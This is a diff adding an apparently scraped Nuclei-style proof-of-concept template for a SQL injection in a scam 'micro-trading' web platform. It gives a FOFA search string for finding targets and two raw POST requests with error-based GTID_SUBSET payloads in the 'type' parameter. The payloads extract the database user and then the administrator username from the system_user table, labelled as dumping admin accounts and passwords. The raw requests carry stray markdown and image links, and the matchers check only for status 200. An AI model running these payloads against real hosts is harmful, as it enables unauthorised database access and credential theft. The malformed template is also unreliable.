@@ -1,0 +1,90 @@
+id: poc-kymg4p2xk4ipyd1l
+info:
+  name: 八国语言微盘杀猪盘诈骗微盘存在前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kymg4p2xk4ipyd1l'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kymg4p2xk4ipyd1l
+    fofa: '"/static/wap/css/common.css"'
+http:
+- raw:
+  - 'POST /index/user/dorecharge HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Content-Length: 17
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: think_var=hk; s47696c33=mp6s4pmvbpa4nqluhbdr7d3pvc
+
+    Host: {{Hostname}}
+
+    Origin: [http://192.168.140.128](http://192.168.140.128)
+
+    Referer: [http://192.168.140.128/index/user/dorecharge](http://192.168.140.128/index/user/dorecharge)
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+
+    type=GTID_SUBSET(CONCAT((SELECT (USER()))),2235)&money=1222
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944196679-713bdbd0-33c7-43a7-8956-63c94c28bd52.png)
+
+    **跑出管理员账户：**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /index/user/dorecharge HTTP/1.1
+
+    Content-Length: 154
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: max-age=0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hk
+
+    Host: {{Hostname}}
+
+    Origin: [http://192.168.140.128](http://192.168.140.128)
+
+    Referer: [http://192.168.140.128/index/user/dorecharge](http://192.168.140.128/index/user/dorecharge)
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+    Connection: close
+
+
+    type=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222
+
+    **跑出管理员密码：**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
